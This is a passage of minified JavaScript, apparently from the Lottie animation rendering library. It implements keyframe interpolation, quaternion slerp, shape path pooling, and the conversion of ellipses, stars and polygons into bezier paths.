                  ft.i.x,
                  ft.i.y,
                  ft.n
                ).get),
                (gt.__fnct = Pt)),
              (_t = Pt((i - xt) / (bt - xt)));
            var kt = wt.segmentLength * _t,
              Rt,
              It =
                a.lastFrame < i && a._lastKeyframeIndex === nt
                  ? a._lastAddedLength
                  : 0;
            for (
              Ct =
                a.lastFrame < i && a._lastKeyframeIndex === nt
                  ? a._lastPoint
                  : 0,
                st = !0,
                Et = wt.points.length;
              st;

            ) {
              if (
                ((It += wt.points[Ct].partialLength),
                kt === 0 || _t === 0 || Ct === wt.points.length - 1)
              ) {
                for (vt = wt.points[Ct].point.length, St = 0; St < vt; St += 1)
                  s[St] = wt.points[Ct].point[St];
                break;
              } else if (
                kt >= It &&
                kt < It + wt.points[Ct + 1].partialLength
              ) {
                for (
                  Rt = (kt - It) / wt.points[Ct + 1].partialLength,
                    vt = wt.points[Ct].point.length,
                    St = 0;
                  St < vt;
                  St += 1
                )
                  s[St] =
                    wt.points[Ct].point[St] +
                    (wt.points[Ct + 1].point[St] - wt.points[Ct].point[St]) *
                      Rt;
                break;
              }
              Ct < Et - 1 ? (Ct += 1) : (st = !1);
            }
            (a._lastPoint = Ct),
              (a._lastAddedLength = It - wt.points[Ct].partialLength),
              (a._lastKeyframeIndex = nt);
          }
        } else {
          var Ot, Nt, zt, Bt, Wt;
          if (((ot = ft.s.length), (yt = ht.s || ft.e), this.sh && ft.h !== 1))
            if (i >= bt) (s[0] = yt[0]), (s[1] = yt[1]), (s[2] = yt[2]);
            else if (i <= xt)
              (s[0] = ft.s[0]), (s[1] = ft.s[1]), (s[2] = ft.s[2]);
            else {
              var Gt = createQuaternion(ft.s),
                Vt = createQuaternion(yt),
                Mt = (i - xt) / (bt - xt);
              quaternionToEuler(s, slerp(Gt, Vt, Mt));
            }
          else
            for (nt = 0; nt < ot; nt += 1)
              ft.h !== 1 &&
                (i >= bt
                  ? (_t = 1)
                  : i < xt
                  ? (_t = 0)
                  : (ft.o.x.constructor === Array
                      ? (gt.__fnct || (gt.__fnct = []),
                        gt.__fnct[nt]
                          ? (Pt = gt.__fnct[nt])
                          : ((Ot =
                              ft.o.x[nt] === void 0 ? ft.o.x[0] : ft.o.x[nt]),
                            (Nt =
                              ft.o.y[nt] === void 0 ? ft.o.y[0] : ft.o.y[nt]),
                            (zt =
                              ft.i.x[nt] === void 0 ? ft.i.x[0] : ft.i.x[nt]),
                            (Bt =
                              ft.i.y[nt] === void 0 ? ft.i.y[0] : ft.i.y[nt]),
                            (Pt = BezierFactory.getBezierEasing(
                              Ot,
                              Nt,
                              zt,
                              Bt
                            ).get),
                            (gt.__fnct[nt] = Pt)))
                      : gt.__fnct
                      ? (Pt = gt.__fnct)
                      : ((Ot = ft.o.x),
                        (Nt = ft.o.y),
                        (zt = ft.i.x),
                        (Bt = ft.i.y),
                        (Pt = BezierFactory.getBezierEasing(
                          Ot,
                          Nt,
                          zt,
                          Bt
                        ).get),
                        (ft.keyframeMetadata = Pt)),
                    (_t = Pt((i - xt) / (bt - xt))))),
                (yt = ht.s || ft.e),
                (Wt =
                  ft.h === 1 ? ft.s[nt] : ft.s[nt] + (yt[nt] - ft.s[nt]) * _t),
                this.propType === "multidimensional" ? (s[nt] = Wt) : (s = Wt);
        }
        return (a.lastIndex = tt), s;
      }
      function slerp(i, a, o) {
        var s = [],
          tt = i[0],
          nt = i[1],
          ot = i[2],
          st = i[3],
          ft = a[0],
          ht = a[1],
          gt = a[2],
          St = a[3],
          vt,
          _t,
          Et,
          Ct,
          Pt;
        return (
          (_t = tt * ft + nt * ht + ot * gt + st * St),
          _t < 0 &&
            ((_t = -_t), (ft = -ft), (ht = -ht), (gt = -gt), (St = -St)),
          1 - _t > 1e-6
            ? ((vt = Math.acos(_t)),
              (Et = Math.sin(vt)),
              (Ct = Math.sin((1 - o) * vt) / Et),
              (Pt = Math.sin(o * vt) / Et))
            : ((Ct = 1 - o), (Pt = o)),
          (s[0] = Ct * tt + Pt * ft),
          (s[1] = Ct * nt + Pt * ht),
          (s[2] = Ct * ot + Pt * gt),
          (s[3] = Ct * st + Pt * St),
          s
        );
      }
      function quaternionToEuler(i, a) {
        var o = a[0],
          s = a[1],
          tt = a[2],
          nt = a[3],
          ot = Math.atan2(2 * s * nt - 2 * o * tt, 1 - 2 * s * s - 2 * tt * tt),
          st = Math.asin(2 * o * s + 2 * tt * nt),
          ft = Math.atan2(2 * o * nt - 2 * s * tt, 1 - 2 * o * o - 2 * tt * tt);
        (i[0] = ot / degToRads),
          (i[1] = st / degToRads),
          (i[2] = ft / degToRads);
      }
      function createQuaternion(i) {
        var a = i[0] * degToRads,
          o = i[1] * degToRads,
          s = i[2] * degToRads,
          tt = Math.cos(a / 2),
          nt = Math.cos(o / 2),
          ot = Math.cos(s / 2),
          st = Math.sin(a / 2),
          ft = Math.sin(o / 2),
          ht = Math.sin(s / 2),
          gt = tt * nt * ot - st * ft * ht,
          St = st * ft * ot + tt * nt * ht,
          vt = st * nt * ot + tt * ft * ht,
          _t = tt * ft * ot - st * nt * ht;
        return [St, vt, _t, gt];
      }
      function getValueAtCurrentTime() {
        var i = this.comp.renderedFrame - this.offsetTime,
          a = this.keyframes[0].t - this.offsetTime,
          o = this.keyframes[this.keyframes.length - 1].t - this.offsetTime;
        if (
          !(
            i === this._caching.lastFrame ||
            (this._caching.lastFrame !== initFrame &&
              ((this._caching.lastFrame >= o && i >= o) ||
                (this._caching.lastFrame < a && i < a)))
          )
        ) {
          this._caching.lastFrame >= i &&
            ((this._caching._lastKeyframeIndex = -1),
            (this._caching.lastIndex = 0));
          var s = this.interpolateValue(i, this._caching);
          this.pv = s;
        }
        return (this._caching.lastFrame = i), this.pv;
      }
      function setVValue(i) {
        var a;
        if (this.propType === "unidimensional")
          (a = i * this.mult),
            mathAbs(this.v - a) > 1e-5 && ((this.v = a), (this._mdf = !0));
        else
          for (var o = 0, s = this.v.length; o < s; )
            (a = i[o] * this.mult),
              mathAbs(this.v[o] - a) > 1e-5 &&
                ((this.v[o] = a), (this._mdf = !0)),
              (o += 1);
      }
      function processEffectsSequence() {
        if (
          !(
            this.elem.globalData.frameId === this.frameId ||
            !this.effectsSequence.length
          )
        ) {
          if (this.lock) {
            this.setVValue(this.pv);
            return;
          }
          (this.lock = !0), (this._mdf = this._isFirstFrame);
          var i,
            a = this.effectsSequence.length,
            o = this.kf ? this.pv : this.data.k;
          for (i = 0; i < a; i += 1) o = this.effectsSequence[i](o);
          this.setVValue(o),
            (this._isFirstFrame = !1),
            (this.lock = !1),
            (this.frameId = this.elem.globalData.frameId);
        }
      }
      function addEffect(i) {
        this.effectsSequence.push(i), this.container.addDynamicProperty(this);
      }
      function ValueProperty(i, a, o, s) {
        (this.propType = "unidimensional"),
          (this.mult = o || 1),
          (this.data = a),
          (this.v = o ? a.k * o : a.k),
          (this.pv = a.k),
          (this._mdf = !1),
          (this.elem = i),
          (this.container = s),
          (this.comp = i.comp),
          (this.k = !1),
          (this.kf = !1),
          (this.vel = 0),
          (this.effectsSequence = []),
          (this._isFirstFrame = !0),
          (this.getValue = processEffectsSequence),
          (this.setVValue = setVValue),
          (this.addEffect = addEffect);
      }
      function MultiDimensionalProperty(i, a, o, s) {
        (this.propType = "multidimensional"),
          (this.mult = o || 1),
          (this.data = a),
          (this._mdf = !1),
          (this.elem = i),
          (this.container = s),
          (this.comp = i.comp),
          (this.k = !1),
          (this.kf = !1),
          (this.frameId = -1);
        var tt,
          nt = a.k.length;
        for (
          this.v = createTypedArray("float32", nt),
            this.pv = createTypedArray("float32", nt),
            this.vel = createTypedArray("float32", nt),
            tt = 0;
          tt < nt;
          tt += 1
        )
          (this.v[tt] = a.k[tt] * this.mult), (this.pv[tt] = a.k[tt]);
        (this._isFirstFrame = !0),
          (this.effectsSequence = []),
          (this.getValue = processEffectsSequence),
          (this.setVValue = setVValue),
          (this.addEffect = addEffect);
      }
      function KeyframedValueProperty(i, a, o, s) {
        (this.propType = "unidimensional"),
          (this.keyframes = a.k),
          (this.keyframesMetadata = []),
          (this.offsetTime = i.data.st),
          (this.frameId = -1),
          (this._caching = {
            lastFrame: initFrame,
            lastIndex: 0,
            value: 0,
            _lastKeyframeIndex: -1,
          }),
          (this.k = !0),
          (this.kf = !0),
          (this.data = a),
          (this.mult = o || 1),
          (this.elem = i),
          (this.container = s),
          (this.comp = i.comp),
          (this.v = initFrame),
          (this.pv = initFrame),
          (this._isFirstFrame = !0),
          (this.getValue = processEffectsSequence),
          (this.setVValue = setVValue),
          (this.interpolateValue = interpolateValue),
          (this.effectsSequence = [getValueAtCurrentTime.bind(this)]),
          (this.addEffect = addEffect);
      }
      function KeyframedMultidimensionalProperty(i, a, o, s) {
        this.propType = "multidimensional";
        var tt,
          nt = a.k.length,
          ot,
          st,
          ft,
          ht;
        for (tt = 0; tt < nt - 1; tt += 1)
          a.k[tt].to &&
            a.k[tt].s &&
            a.k[tt + 1] &&
            a.k[tt + 1].s &&
            ((ot = a.k[tt].s),
            (st = a.k[tt + 1].s),
            (ft = a.k[tt].to),
            (ht = a.k[tt].ti),
            ((ot.length === 2 &&
              !(ot[0] === st[0] && ot[1] === st[1]) &&
              bez.pointOnLine2D(
                ot[0],
                ot[1],
                st[0],
                st[1],
                ot[0] + ft[0],
                ot[1] + ft[1]
              ) &&
              bez.pointOnLine2D(
                ot[0],
                ot[1],
                st[0],
                st[1],
                st[0] + ht[0],
                st[1] + ht[1]
              )) ||
              (ot.length === 3 &&
                !(ot[0] === st[0] && ot[1] === st[1] && ot[2] === st[2]) &&
                bez.pointOnLine3D(
                  ot[0],
                  ot[1],
                  ot[2],
                  st[0],
                  st[1],
                  st[2],
                  ot[0] + ft[0],
                  ot[1] + ft[1],
                  ot[2] + ft[2]
                ) &&
                bez.pointOnLine3D(
                  ot[0],
                  ot[1],
                  ot[2],
                  st[0],
                  st[1],
                  st[2],
                  st[0] + ht[0],
                  st[1] + ht[1],
                  st[2] + ht[2]
                ))) &&
              ((a.k[tt].to = null), (a.k[tt].ti = null)),
            ot[0] === st[0] &&
              ot[1] === st[1] &&
              ft[0] === 0 &&
              ft[1] === 0 &&
              ht[0] === 0 &&
              ht[1] === 0 &&
              (ot.length === 2 ||
                (ot[2] === st[2] && ft[2] === 0 && ht[2] === 0)) &&
              ((a.k[tt].to = null), (a.k[tt].ti = null)));
        (this.effectsSequence = [getValueAtCurrentTime.bind(this)]),
          (this.data = a),
          (this.keyframes = a.k),
          (this.keyframesMetadata = []),
          (this.offsetTime = i.data.st),
          (this.k = !0),
          (this.kf = !0),
          (this._isFirstFrame = !0),
          (this.mult = o || 1),
          (this.elem = i),
          (this.container = s),
          (this.comp = i.comp),
          (this.getValue = processEffectsSequence),
          (this.setVValue = setVValue),
          (this.interpolateValue = interpolateValue),
          (this.frameId = -1);
        var gt = a.k[0].s.length;
        for (
          this.v = createTypedArray("float32", gt),
            this.pv = createTypedArray("float32", gt),
            tt = 0;
          tt < gt;
          tt += 1
        )
          (this.v[tt] = initFrame), (this.pv[tt] = initFrame);
        (this._caching = {
          lastFrame: initFrame,
          lastIndex: 0,
          value: createTypedArray("float32", gt),
        }),
          (this.addEffect = addEffect);
      }
      var PropertyFactory = (function () {
        function i(o, s, tt, nt, ot) {
          s.sid && (s = o.globalData.slotManager.getProp(s));
          var st;
          if (!s.k.length) st = new ValueProperty(o, s, nt, ot);
          else if (typeof s.k[0] == "number")
            st = new MultiDimensionalProperty(o, s, nt, ot);
          else
            switch (tt) {
              case 0:
                st = new KeyframedValueProperty(o, s, nt, ot);
                break;
              case 1:
                st = new KeyframedMultidimensionalProperty(o, s, nt, ot);
                break;
            }
          return st.effectsSequence.length && ot.addDynamicProperty(st), st;
        }
        var a = { getProp: i };
        return a;
      })();
      function DynamicPropertyContainer() {}
      DynamicPropertyContainer.prototype = {
        addDynamicProperty: function (a) {
          this.dynamicProperties.indexOf(a) === -1 &&
            (this.dynamicProperties.push(a),
            this.container.addDynamicProperty(this),
            (this._isAnimated = !0));
        },
        iterateDynamicProperties: function () {
          this._mdf = !1;
          var a,
            o = this.dynamicProperties.length;
          for (a = 0; a < o; a += 1)
            this.dynamicProperties[a].getValue(),
              this.dynamicProperties[a]._mdf && (this._mdf = !0);
        },
        initDynamicPropertyContainer: function (a) {
          (this.container = a),
            (this.dynamicProperties = []),
            (this._mdf = !1),
            (this._isAnimated = !1);
        },
      };
      var pointPool = (function () {
        function i() {
          return createTypedArray("float32", 2);
        }
        return poolFactory(8, i);
      })();
      function ShapePath() {
        (this.c = !1),
          (this._length = 0),
          (this._maxLength = 8),
          (this.v = createSizedArray(this._maxLength)),
          (this.o = createSizedArray(this._maxLength)),
          (this.i = createSizedArray(this._maxLength));
      }
      (ShapePath.prototype.setPathData = function (i, a) {
        (this.c = i), this.setLength(a);
        for (var o = 0; o < a; )
          (this.v[o] = pointPool.newElement()),
            (this.o[o] = pointPool.newElement()),
            (this.i[o] = pointPool.newElement()),
            (o += 1);
      }),
        (ShapePath.prototype.setLength = function (i) {
          for (; this._maxLength < i; ) this.doubleArrayLength();
          this._length = i;
        }),
        (ShapePath.prototype.doubleArrayLength = function () {
          (this.v = this.v.concat(createSizedArray(this._maxLength))),
            (this.i = this.i.concat(createSizedArray(this._maxLength))),
            (this.o = this.o.concat(createSizedArray(this._maxLength))),
            (this._maxLength *= 2);
        }),
        (ShapePath.prototype.setXYAt = function (i, a, o, s, tt) {
          var nt;
          switch (
            ((this._length = Math.max(this._length, s + 1)),
            this._length >= this._maxLength && this.doubleArrayLength(),
            o)
          ) {
            case "v":
              nt = this.v;
              break;
            case "i":
              nt = this.i;
              break;
            case "o":
              nt = this.o;
              break;
            default:
              nt = [];
              break;
          }
          (!nt[s] || (nt[s] && !tt)) && (nt[s] = pointPool.newElement()),
            (nt[s][0] = i),
            (nt[s][1] = a);
        }),
        (ShapePath.prototype.setTripleAt = function (
          i,
          a,
          o,
          s,
          tt,
          nt,
          ot,
          st
        ) {
          this.setXYAt(i, a, "v", ot, st),
            this.setXYAt(o, s, "o", ot, st),
            this.setXYAt(tt, nt, "i", ot, st);
        }),
        (ShapePath.prototype.reverse = function () {
          var i = new ShapePath();
          i.setPathData(this.c, this._length);
          var a = this.v,
            o = this.o,
            s = this.i,
            tt = 0;
          this.c &&
            (i.setTripleAt(
              a[0][0],
              a[0][1],
              s[0][0],
              s[0][1],
              o[0][0],
              o[0][1],
              0,
              !1
            ),
            (tt = 1));
          var nt = this._length - 1,
            ot = this._length,
            st;
          for (st = tt; st < ot; st += 1)
            i.setTripleAt(
              a[nt][0],
              a[nt][1],
              s[nt][0],
              s[nt][1],
              o[nt][0],
              o[nt][1],
              st,
              !1
            ),
              (nt -= 1);
          return i;
        }),
        (ShapePath.prototype.length = function () {
          return this._length;
        });
      var shapePool = (function () {
        function i() {
          return new ShapePath();
        }
        function a(tt) {
          var nt = tt._length,
            ot;
          for (ot = 0; ot < nt; ot += 1)
            pointPool.release(tt.v[ot]),
              pointPool.release(tt.i[ot]),
              pointPool.release(tt.o[ot]),
              (tt.v[ot] = null),
              (tt.i[ot] = null),
              (tt.o[ot] = null);
          (tt._length = 0), (tt.c = !1);
        }
        function o(tt) {
          var nt = s.newElement(),
            ot,
            st = tt._length === void 0 ? tt.v.length : tt._length;
          for (nt.setLength(st), nt.c = tt.c, ot = 0; ot < st; ot += 1)
            nt.setTripleAt(
              tt.v[ot][0],
              tt.v[ot][1],
              tt.o[ot][0],
              tt.o[ot][1],
              tt.i[ot][0],
              tt.i[ot][1],
              ot
            );
          return nt;
        }
        var s = poolFactory(4, i, a);
        return (s.clone = o), s;
      })();
      function ShapeCollection() {
        (this._length = 0),
          (this._maxLength = 4),
          (this.shapes = createSizedArray(this._maxLength));
      }
      (ShapeCollection.prototype.addShape = function (i) {
        this._length === this._maxLength &&
          ((this.shapes = this.shapes.concat(
            createSizedArray(this._maxLength)
          )),
          (this._maxLength *= 2)),
          (this.shapes[this._length] = i),
          (this._length += 1);
      }),
        (ShapeCollection.prototype.releaseShapes = function () {
          var i;
          for (i = 0; i < this._length; i += 1)
            shapePool.release(this.shapes[i]);
          this._length = 0;
        });
      var shapeCollectionPool = (function () {
          var i = { newShapeCollection: tt, release: nt },
            a = 0,
            o = 4,
            s = createSizedArray(o);
          function tt() {
            var ot;
            return (
              a ? ((a -= 1), (ot = s[a])) : (ot = new ShapeCollection()), ot
            );
          }
          function nt(ot) {
            var st,
              ft = ot._length;
            for (st = 0; st < ft; st += 1) shapePool.release(ot.shapes[st]);
            (ot._length = 0),
              a === o && ((s = pooling.double(s)), (o *= 2)),
              (s[a] = ot),
              (a += 1);
          }
          return i;
        })(),
        ShapePropertyFactory = (function () {
          var i = -999999;
          function a(bt, xt, yt) {
            var wt = yt.lastIndex,
              $t,
              kt,
              Rt,
              It,
              Ot,
              Nt,
              zt,
              Bt,
              Wt,
              Gt = this.keyframes;
            if (bt < Gt[0].t - this.offsetTime)
              ($t = Gt[0].s[0]), (Rt = !0), (wt = 0);
            else if (bt >= Gt[Gt.length - 1].t - this.offsetTime)
              ($t = Gt[Gt.length - 1].s
                ? Gt[Gt.length - 1].s[0]
                : Gt[Gt.length - 2].e[0]),
                (Rt = !0);
            else {
              for (
                var Vt = wt, Mt = Gt.length - 1, Ft = !0, Tt, At, Lt;
                Ft &&
                ((Tt = Gt[Vt]),
                (At = Gt[Vt + 1]),
                !(At.t - this.offsetTime > bt));

              )
                Vt < Mt - 1 ? (Vt += 1) : (Ft = !1);
              if (
                ((Lt = this.keyframesMetadata[Vt] || {}),
                (Rt = Tt.h === 1),
                (wt = Vt),
                !Rt)
              ) {
                if (bt >= At.t - this.offsetTime) Bt = 1;
                else if (bt < Tt.t - this.offsetTime) Bt = 0;
                else {
                  var jt;
                  Lt.__fnct
                    ? (jt = Lt.__fnct)
                    : ((jt = BezierFactory.getBezierEasing(
                        Tt.o.x,
                        Tt.o.y,
                        Tt.i.x,
                        Tt.i.y
                      ).get),
                      (Lt.__fnct = jt)),
                    (Bt = jt(
                      (bt - (Tt.t - this.offsetTime)) /
                        (At.t - this.offsetTime - (Tt.t - this.offsetTime))
                    ));
                }
                kt = At.s ? At.s[0] : Tt.e[0];
              }
              $t = Tt.s[0];
            }
            for (
              Nt = xt._length, zt = $t.i[0].length, yt.lastIndex = wt, It = 0;
              It < Nt;
              It += 1
            )
              for (Ot = 0; Ot < zt; Ot += 1)
                (Wt = Rt
                  ? $t.i[It][Ot]
                  : $t.i[It][Ot] + (kt.i[It][Ot] - $t.i[It][Ot]) * Bt),
                  (xt.i[It][Ot] = Wt),
                  (Wt = Rt
                    ? $t.o[It][Ot]
                    : $t.o[It][Ot] + (kt.o[It][Ot] - $t.o[It][Ot]) * Bt),
                  (xt.o[It][Ot] = Wt),
                  (Wt = Rt
                    ? $t.v[It][Ot]
                    : $t.v[It][Ot] + (kt.v[It][Ot] - $t.v[It][Ot]) * Bt),
                  (xt.v[It][Ot] = Wt);
          }
          function o() {
            var bt = this.comp.renderedFrame - this.offsetTime,
              xt = this.keyframes[0].t - this.offsetTime,
              yt =
                this.keyframes[this.keyframes.length - 1].t - this.offsetTime,
              wt = this._caching.lastFrame;
            return (
              (wt !== i && ((wt < xt && bt < xt) || (wt > yt && bt > yt))) ||
                ((this._caching.lastIndex =
                  wt < bt ? this._caching.lastIndex : 0),
                this.interpolateShape(bt, this.pv, this._caching)),
              (this._caching.lastFrame = bt),
              this.pv
            );
          }
          function s() {
            this.paths = this.localShapeCollection;
          }
          function tt(bt, xt) {
            if (bt._length !== xt._length || bt.c !== xt.c) return !1;
            var yt,
              wt = bt._length;
            for (yt = 0; yt < wt; yt += 1)
              if (
                bt.v[yt][0] !== xt.v[yt][0] ||
                bt.v[yt][1] !== xt.v[yt][1] ||
                bt.o[yt][0] !== xt.o[yt][0] ||
                bt.o[yt][1] !== xt.o[yt][1] ||
                bt.i[yt][0] !== xt.i[yt][0] ||
                bt.i[yt][1] !== xt.i[yt][1]
              )
                return !1;
            return !0;
          }
          function nt(bt) {
            tt(this.v, bt) ||
              ((this.v = shapePool.clone(bt)),
              this.localShapeCollection.releaseShapes(),
              this.localShapeCollection.addShape(this.v),
              (this._mdf = !0),
              (this.paths = this.localShapeCollection));
          }
          function ot() {
            if (this.elem.globalData.frameId !== this.frameId) {
              if (!this.effectsSequence.length) {
                this._mdf = !1;
                return;
              }
              if (this.lock) {
                this.setVValue(this.pv);
                return;
              }
              (this.lock = !0), (this._mdf = !1);
              var bt;
              this.kf
                ? (bt = this.pv)
                : this.data.ks
                ? (bt = this.data.ks.k)
                : (bt = this.data.pt.k);
              var xt,
                yt = this.effectsSequence.length;
              for (xt = 0; xt < yt; xt += 1) bt = this.effectsSequence[xt](bt);
              this.setVValue(bt),
                (this.lock = !1),
                (this.frameId = this.elem.globalData.frameId);
            }
          }
          function st(bt, xt, yt) {
            (this.propType = "shape"),
              (this.comp = bt.comp),
              (this.container = bt),
              (this.elem = bt),
              (this.data = xt),
              (this.k = !1),
              (this.kf = !1),
              (this._mdf = !1);
            var wt = yt === 3 ? xt.pt.k : xt.ks.k;
            (this.v = shapePool.clone(wt)),
              (this.pv = shapePool.clone(this.v)),
              (this.localShapeCollection =
                shapeCollectionPool.newShapeCollection()),
              (this.paths = this.localShapeCollection),
              this.paths.addShape(this.v),
              (this.reset = s),
              (this.effectsSequence = []);
          }
          function ft(bt) {
            this.effectsSequence.push(bt),
              this.container.addDynamicProperty(this);
          }
          (st.prototype.interpolateShape = a),
            (st.prototype.getValue = ot),
            (st.prototype.setVValue = nt),
            (st.prototype.addEffect = ft);
          function ht(bt, xt, yt) {
            (this.propType = "shape"),
              (this.comp = bt.comp),
              (this.elem = bt),
              (this.container = bt),
              (this.offsetTime = bt.data.st),
              (this.keyframes = yt === 3 ? xt.pt.k : xt.ks.k),
              (this.keyframesMetadata = []),
              (this.k = !0),
              (this.kf = !0);
            var wt = this.keyframes[0].s[0].i.length;
            (this.v = shapePool.newElement()),
              this.v.setPathData(this.keyframes[0].s[0].c, wt),
              (this.pv = shapePool.clone(this.v)),
              (this.localShapeCollection =
                shapeCollectionPool.newShapeCollection()),
              (this.paths = this.localShapeCollection),
              this.paths.addShape(this.v),
              (this.lastFrame = i),
              (this.reset = s),
              (this._caching = { lastFrame: i, lastIndex: 0 }),
              (this.effectsSequence = [o.bind(this)]);
          }
          (ht.prototype.getValue = ot),
            (ht.prototype.interpolateShape = a),
            (ht.prototype.setVValue = nt),
            (ht.prototype.addEffect = ft);
          var gt = (function () {
              var bt = roundCorner;
              function xt(yt, wt) {
                (this.v = shapePool.newElement()),
                  this.v.setPathData(!0, 4),
                  (this.localShapeCollection =
                    shapeCollectionPool.newShapeCollection()),
                  (this.paths = this.localShapeCollection),
                  this.localShapeCollection.addShape(this.v),
                  (this.d = wt.d),
                  (this.elem = yt),
                  (this.comp = yt.comp),
                  (this.frameId = -1),
                  this.initDynamicPropertyContainer(yt),
                  (this.p = PropertyFactory.getProp(yt, wt.p, 1, 0, this)),
                  (this.s = PropertyFactory.getProp(yt, wt.s, 1, 0, this)),
                  this.dynamicProperties.length
                    ? (this.k = !0)
                    : ((this.k = !1), this.convertEllToPath());
              }
              return (
                (xt.prototype = {
                  reset: s,
                  getValue: function () {
                    this.elem.globalData.frameId !== this.frameId &&
                      ((this.frameId = this.elem.globalData.frameId),
                      this.iterateDynamicProperties(),
                      this._mdf && this.convertEllToPath());
                  },
                  convertEllToPath: function () {
                    var wt = this.p.v[0],
                      $t = this.p.v[1],
                      kt = this.s.v[0] / 2,
                      Rt = this.s.v[1] / 2,
                      It = this.d !== 3,
                      Ot = this.v;
                    (Ot.v[0][0] = wt),
                      (Ot.v[0][1] = $t - Rt),
                      (Ot.v[1][0] = It ? wt + kt : wt - kt),
                      (Ot.v[1][1] = $t),
                      (Ot.v[2][0] = wt),
                      (Ot.v[2][1] = $t + Rt),
                      (Ot.v[3][0] = It ? wt - kt : wt + kt),
                      (Ot.v[3][1] = $t),
                      (Ot.i[0][0] = It ? wt - kt * bt : wt + kt * bt),
                      (Ot.i[0][1] = $t - Rt),
                      (Ot.i[1][0] = It ? wt + kt : wt - kt),
                      (Ot.i[1][1] = $t - Rt * bt),
                      (Ot.i[2][0] = It ? wt + kt * bt : wt - kt * bt),
                      (Ot.i[2][1] = $t + Rt),
                      (Ot.i[3][0] = It ? wt - kt : wt + kt),
                      (Ot.i[3][1] = $t + Rt * bt),
                      (Ot.o[0][0] = It ? wt + kt * bt : wt - kt * bt),
                      (Ot.o[0][1] = $t - Rt),
                      (Ot.o[1][0] = It ? wt + kt : wt - kt),
                      (Ot.o[1][1] = $t + Rt * bt),
                      (Ot.o[2][0] = It ? wt - kt * bt : wt + kt * bt),
                      (Ot.o[2][1] = $t + Rt),
                      (Ot.o[3][0] = It ? wt - kt : wt + kt),
                      (Ot.o[3][1] = $t - Rt * bt);
                  },
                }),
                extendPrototype([DynamicPropertyContainer], xt),
                xt
              );
            })(),
            St = (function () {
              function bt(xt, yt) {
                (this.v = shapePool.newElement()),
                  this.v.setPathData(!0, 0),
                  (this.elem = xt),
                  (this.comp = xt.comp),
                  (this.data = yt),
                  (this.frameId = -1),
                  (this.d = yt.d),
                  this.initDynamicPropertyContainer(xt),
                  yt.sy === 1
                    ? ((this.ir = PropertyFactory.getProp(
                        xt,
                        yt.ir,
                        0,
                        0,
                        this
                      )),
                      (this.is = PropertyFactory.getProp(
                        xt,
                        yt.is,
                        0,
                        0.01,
                        this
                      )),
                      (this.convertToPath = this.convertStarToPath))
                    : (this.convertToPath = this.convertPolygonToPath),
                  (this.pt = PropertyFactory.getProp(xt, yt.pt, 0, 0, this)),
                  (this.p = PropertyFactory.getProp(xt, yt.p, 1, 0, this)),
                  (this.r = PropertyFactory.getProp(
                    xt,
                    yt.r,
                    0,
                    degToRads,
                    this
                  )),
                  (this.or = PropertyFactory.getProp(xt, yt.or, 0, 0, this)),
                  (this.os = PropertyFactory.getProp(xt, yt.os, 0, 0.01, this)),
                  (this.localShapeCollection =
                    shapeCollectionPool.newShapeCollection()),
                  this.localShapeCollection.addShape(this.v),
                  (this.paths = this.localShapeCollection),
                  this.dynamicProperties.length
                    ? (this.k = !0)
                    : ((this.k = !1), this.convertToPath());
              }
              return (
                (bt.prototype = {
                  reset: s,
                  getValue: function () {
                    this.elem.globalData.frameId !== this.frameId &&
                      ((this.frameId = this.elem.globalData.frameId),
                      this.iterateDynamicProperties(),
                      this._mdf && this.convertToPath());
                  },
                  convertStarToPath: function () {
                    var yt = Math.floor(this.pt.v) * 2,
                      wt = (Math.PI * 2) / yt,
                      $t = !0,
                      kt = this.or.v,
                      Rt = this.ir.v,
                      It = this.os.v,
                      Ot = this.is.v,
                      Nt = (2 * Math.PI * kt) / (yt * 2),
                      zt = (2 * Math.PI * Rt) / (yt * 2),
                      Bt,
                      Wt,
                      Gt,
                      Vt,
                      Mt = -Math.PI / 2;
                    Mt += this.r.v;
                    var Ft = this.data.d === 3 ? -1 : 1;
                    for (this.v._length = 0, Bt = 0; Bt < yt; Bt += 1) {
                      (Wt = $t ? kt : Rt),
                        (Gt = $t ? It : Ot),
                        (Vt = $t ? Nt : zt);
                      var Tt = Wt * Math.cos(Mt),
                        At = Wt * Math.sin(Mt),
                        Lt =
                          Tt === 0 && At === 0
                            ? 0
                            : At / Math.sqrt(Tt * Tt + At * At),
                        jt =
                          Tt === 0 && At === 0
                            ? 0
                            : -Tt / Math.sqrt(Tt * Tt + At * At);
                      (Tt += +this.p.v[0]),
                        (At += +this.p.v[1]),
                        this.v.setTripleAt(
                          Tt,
                          At,
                          Tt - Lt * Vt * Gt * Ft,
                          At - jt * Vt * Gt * Ft,
                          Tt + Lt * Vt * Gt * Ft,
                          At + jt * Vt * Gt * Ft,
                          Bt,
                          !0
                        ),
                        ($t = !$t),
                        (Mt += wt * Ft);
                    }
                  },
                  convertPolygonToPath: function () {
                    var yt = Math.floor(this.pt.v),
                      wt = (Math.PI * 2) / yt,
                      $t = this.or.v,
                      kt = this.os.v,
                      Rt = (2 * Math.PI * $t) / (yt * 4),
                      It,
                      Ot = -Math.PI * 0.5,
                      Nt = this.data.d === 3 ? -1 : 1;
                    for (
                      Ot += this.r.v, this.v._length = 0, It = 0;
                      It < yt;
                      It += 1
                    ) {
                      var zt = $t * Math.cos(Ot),
                        Bt = $t * Math.sin(Ot),
                        Wt =
                          zt === 0 && Bt === 0
                            ? 0
                            : Bt / Math.sqrt(zt * zt + Bt * Bt),
                        Gt =
                          zt === 0 && Bt === 0
                            ? 0
                            : -zt / Math.sqrt(zt * zt + Bt * Bt);
                      (zt += +this.p.v[0]),
                        (Bt += +this.p.v[1]),
                        this.v.setTripleAt(
                          zt,
                          Bt,
                          zt - Wt * Rt * kt * Nt,
                          Bt - Gt * Rt * kt * Nt,
                          zt + Wt * Rt * kt * Nt,
                          Bt + Gt * Rt * kt * Nt,
                          It,
                          !0
                        ),
                        (Ot += wt * Nt);
                    }
                    (this.paths.length = 0), (this.paths[0] = this.v);
                  },
                }),
                extendPrototype([DynamicPropertyContainer], bt),
                bt
              );
            })(),
            vt = (function () {
              function bt(xt, yt) {
                (this.v = shapePool.newElement()),
                  (this.v.c = !0),
                  (this.localShapeCollection =
                    shapeCollectionPool.newShapeCollection()),
                  this.localShapeCollection.addShape(this.v),
                  (this.paths = this.localShapeCollection),
                  (this.elem = xt),
                  (this.comp = xt.comp),
                  (this.frameId = -1),
                  (this.d = yt.d),
                  this.initDynamicPropertyContainer(xt),
                  (this.p = PropertyFactory.getProp(xt, yt.p, 1, 0, this)),
                  (this.s = PropertyFactory.getProp(xt, yt.s, 1, 0, this)),
                  (this.r = PropertyFactory.getProp(xt, yt.r, 0, 0, this)),
